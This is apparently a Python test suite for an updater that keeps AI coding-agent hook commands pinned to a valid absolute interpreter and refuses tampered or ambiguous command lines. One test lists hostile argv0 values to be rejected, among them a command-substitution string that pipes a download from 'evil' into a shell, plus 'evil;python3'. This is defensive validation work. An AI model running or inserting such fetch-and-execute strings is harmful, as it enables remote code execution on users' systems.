"""Managed hooks retain the usable absolute interpreter chosen at install time.

An updater may run under a different Python. It accepts that difference only
when the installed argv[0] is still executable and every owned command tail is
unchanged. Missing interpreters and all other command changes remain fail-closed.
"""
from __future__ import annotations

import importlib.util
import json
import os
import shlex
import shutil
import sys
from pathlib import Path

import pytest

from scripts import _aqg_interpreter
from scripts.aqg_update.hosts import hook_inputs, managed, reconcile

REPO = Path(__file__).resolve().parents[2]
HOOK = "pretooluse_secret_scan.sh"
INSTALLERS = [
    "install_cursor_support.py",
    "install_aqg_work_clients.py",
    "install_aqg_qoder.py",
    "install_aqg_agent_clients.py",
    "install_aqg_pi.py",
]
JSON_HOSTS = ["cursor", "codebuddy", "qoder", "trae", "devin"]
MANAGED = JSON_HOSTS + ["kimi-code", "pi"]


def _load(installer: str, tag: str, monkeypatch):
    spec = importlib.util.spec_from_file_location(f"_aqg_interp_{tag}_{installer[:-3]}", REPO / "scripts" / installer)
    module = importlib.util.module_from_spec(spec)
    # dataclasses resolve annotations through sys.modules on Python 3.9.
    monkeypatch.setitem(sys.modules, spec.name, module)
    spec.loader.exec_module(module)
    return module


def _render(module, installer: str):
    if installer == "install_cursor_support.py":
        return module._quoted_command("preToolUse", REPO)
    if installer == "install_aqg_work_clients.py":
        return module._quoted_command("PreToolUse", REPO)
    if installer == "install_aqg_qoder.py":
        return module._hook_command(REPO, HOOK)
    if installer == "install_aqg_pi.py":
        return module._command_argv(REPO, HOOK)
    return module._hook_command(REPO, "trae", HOOK)


def _argv0(command) -> str:
    return command[0] if isinstance(command, list) else shlex.split(command)[0]


def test_hook_interpreter_keeps_the_running_absolute_path(monkeypatch, tmp_path):
    executable = tmp_path / "python"
    executable.write_bytes(b"interpreter fixture")
    executable.chmod(0o700)
    monkeypatch.setattr(sys, "executable", str(executable))
    assert _aqg_interpreter.hook_interpreter() == str(executable)


@pytest.mark.parametrize("installer", INSTALLERS)
def test_rendering_keeps_the_running_interpreter(installer, monkeypatch, tmp_path):
    module = _load(installer, "nt", monkeypatch)
    executable_path = tmp_path / "Python With Space" / ("python.exe" if os.name == "nt" else "python3")
    executable_path.parent.mkdir()
    executable_path.write_bytes(b"interpreter fixture")
    executable_path.chmod(0o700)
    executable = str(executable_path)
    monkeypatch.setattr(sys, "executable", executable)
    command = _render(module, installer)
    text = command[0] if isinstance(command, list) else command
    assert executable in text


@pytest.mark.parametrize("executable", ["", "python3"])
def test_hook_interpreter_refuses_a_non_absolute_executable(monkeypatch, executable):
    monkeypatch.setattr(sys, "executable", executable)
    with pytest.raises(RuntimeError, match="absolute executable Python"):
        _aqg_interpreter.hook_interpreter()


def test_hook_interpreter_refuses_a_missing_absolute_executable(monkeypatch, tmp_path):
    monkeypatch.setattr(sys, "executable", str(tmp_path / "missing-python"))
    with pytest.raises(RuntimeError, match="absolute executable Python"):
        _aqg_interpreter.hook_interpreter()


def _tree(root: Path, client: str) -> Path:
    (root / "scripts").mkdir(parents=True)
    hooks = root / "agent-packs" / "claude-code" / "hooks"
    hooks.mkdir(parents=True)
    for name in (f"{managed.FAMILIES[client]}.py", "aqg_client_registry.py", "_aqg_interpreter.py"):
        source = REPO / "scripts" / name
        if source.is_file():
            shutil.copyfile(source, root / "scripts" / name)
    for script in (REPO / "agent-packs" / "claude-code" / "hooks").glob("*.sh"):
        shutil.copyfile(script, hooks / script.name)
    return root


@pytest.mark.parametrize("client", MANAGED)
def test_helper_only_change_is_a_managed_hook_input_change(tmp_path, client):
    current, target = _tree(tmp_path / "current", client), _tree(tmp_path / "target", client)
    assert hook_inputs.unchanged(client, current, target)
    helper = target / "scripts" / "_aqg_interpreter.py"
    helper.write_text((helper.read_text(encoding="utf-8") if helper.is_file() else "") + "\n# changed\n", encoding="utf-8")
    assert not hook_inputs.unchanged(client, current, target)


def _pinned_fixture(tmp_path: Path, client: str, executable: str):
    """Write a canonical host config whose commands use another interpreter."""
    adapter = managed.ManagedAdapter(client, home=tmp_path / "home", aqg_root=REPO)
    original = adapter.installer.hook_interpreter
    adapter.installer.hook_interpreter = lambda: executable
    try:
        path, expected = adapter.canonical_config()
    finally:
        adapter.installer.hook_interpreter = original
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(expected.encode("utf-8"))
    return adapter, path


def _owned_commands(text: str):
    def walk(value):
        if isinstance(value, dict):
            for key, item in value.items():
                if key == "command" and isinstance(item, str):
                    yield item
                else:
                    yield from walk(item)
        elif isinstance(value, list):
            for item in value:
                yield from walk(item)
    return [c for c in walk(json.loads(text)) if any(m in c for m in managed.COMMAND_MARKERS)]


def _pins(tmp_path: Path) -> dict[str, str]:
    foreign = tmp_path / "not-the-updaters-python3"
    foreign.write_bytes(b"a different interpreter binary")
    foreign.chmod(0o700)
    spaced = tmp_path / "My Python 3.13" / "python3.13"
    spaced.parent.mkdir()
    spaced.write_bytes(b"a different interpreter binary")
    spaced.chmod(0o700)
    return {"foreign": str(foreign), "spaced": str(spaced), "running": sys.executable}


@pytest.mark.parametrize("client", MANAGED)
def test_valid_installed_interpreter_is_preserved_across_updater_python(tmp_path, client):
    executable = _pins(tmp_path)["foreign"]
    adapter, path = _pinned_fixture(tmp_path, client, executable)
    before = path.read_bytes()

    assert adapter.verify().hooks_status == "complete"
    edit = adapter.prepare_hook_edit(REPO)
    assert edit.before == before
    assert json.dumps(executable)[1:-1] in edit.after.decode("utf-8")
    assert reconcile.trusted_snapshot(adapter, before, edit.after)
    edit.apply()
    assert edit.verify()
    assert adapter.verify().hooks_status == "complete"


@pytest.mark.parametrize("pin", ["spaced", "running"])
@pytest.mark.parametrize("client", MANAGED)
def test_other_valid_absolute_interpreter_spellings_are_preserved(tmp_path, client, pin):
    executable = _pins(tmp_path)[pin]
    adapter, path = _pinned_fixture(tmp_path, client, executable)
    assert adapter.verify().hooks_status == "complete"
    edit = adapter.prepare_hook_edit(REPO)
    assert json.dumps(executable)[1:-1] in edit.after.decode("utf-8")


def _edit_owned_commands(path: Path, rewrite):
    data = json.loads(path.read_text(encoding="utf-8"))

    def walk(value):
        if isinstance(value, dict):
            for key, item in value.items():
                if key == "command" and isinstance(item, str) and any(m in item for m in managed.COMMAND_MARKERS):
                    value[key] = rewrite(item)
                else:
                    walk(item)
        elif isinstance(value, list):
            for item in value:
                walk(item)
    walk(data)
    path.write_text(json.dumps(data), encoding="utf-8")


@pytest.mark.parametrize("argv0", ["bash", "sudo", "python3.12", "evil;python3", '"$(curl evil|sh)"', "./python3"])
def test_non_absolute_interpreter_is_not_preserved(tmp_path, argv0):
    foreign = _pins(tmp_path)["foreign"]
    adapter, path = _pinned_fixture(tmp_path, "cursor", foreign)
    _edit_owned_commands(path, lambda c: argv0 + c[len(shlex.quote(foreign)):])
    before = path.read_bytes()
    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


@pytest.mark.parametrize("client", JSON_HOSTS)
def test_pinned_interpreter_with_a_changed_tail_is_still_refused(tmp_path, client):
    adapter, path = _pinned_fixture(tmp_path, client, _pins(tmp_path)["foreign"])
    _edit_owned_commands(path, lambda command: command + " --user-owned-flag")
    before = path.read_bytes()
    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


@pytest.mark.parametrize("client", ["kimi-code", "pi"])
def test_non_json_command_tail_change_is_still_refused(tmp_path, client):
    adapter, path = _pinned_fixture(tmp_path, client, _pins(tmp_path)["foreign"])
    text = path.read_text(encoding="utf-8")
    assert "--aqg-root" in text
    path.write_bytes(text.replace("--aqg-root", "--user-owned-flag", 1).encode("utf-8"))
    before = path.read_bytes()

    assert adapter.verify().hooks_status == "stale"
    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


def test_interpreter_text_in_a_later_argument_is_not_normalized(tmp_path):
    installed = _pins(tmp_path)["foreign"]
    canonical = sys.executable
    marker = str(REPO / "scripts" / "cursor_aqg_hook.py")
    expected_command = f'"{canonical}" {marker} --probe "{canonical}"'
    actual_command = f'"{installed}" {marker} --probe "{installed}"'
    expected = json.dumps({"command": expected_command})
    actual = json.dumps({"command": actual_command})

    assert managed.preserve_interpreter(expected, actual) == expected


def test_ambiguous_interpreter_matches_are_refused(tmp_path):
    pins = _pins(tmp_path)
    adapter, path = _pinned_fixture(tmp_path, "cursor", pins["foreign"])
    data = json.loads(path.read_text(encoding="utf-8"))
    duplicate = dict(data["hooks"]["sessionStart"][0])
    duplicate["command"] = duplicate["command"].replace(pins["foreign"], pins["spaced"])
    data["hooks"]["sessionStart"].append(duplicate)
    path.write_bytes(json.dumps(data).encode("utf-8"))
    before = path.read_bytes()

    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


def test_toml_command_extraction_fails_closed(tmp_path):
    adapter, path = _pinned_fixture(tmp_path, "kimi-code", _pins(tmp_path)["foreign"])
    text = path.read_text(encoding="utf-8").replace("command =", "command_x =")
    path.write_bytes(text.encode("utf-8"))
    before = path.read_bytes()

    with pytest.raises(managed.AdapterError, match="TOML commands"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


def test_qoder_fallback_operator_must_match_byte_for_byte(tmp_path):
    adapter, path = _pinned_fixture(tmp_path, "qoder", _pins(tmp_path)["foreign"])
    _edit_owned_commands(path, lambda c: c.replace(" || exit ", " '||' exit "))
    before = path.read_bytes()
    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


@pytest.mark.parametrize("client", MANAGED)
def test_missing_installed_interpreter_is_refused(tmp_path, client):
    executable = str(tmp_path / "removed-python")
    adapter, path = _pinned_fixture(tmp_path, client, executable)
    before = path.read_bytes()
    assert adapter.verify().hooks_status == "stale"
    with pytest.raises(managed.AdapterError, match="unrecognized"):
        adapter.prepare_hook_edit(REPO)
    assert path.read_bytes() == before


@pytest.mark.parametrize("client", MANAGED)
def test_isolated_candidate_renderer_resolves_the_helper(tmp_path, client):
    content = reconcile.render(REPO, REPO, tmp_path, client)
    assert json.dumps(sys.executable)[1:-1] in content
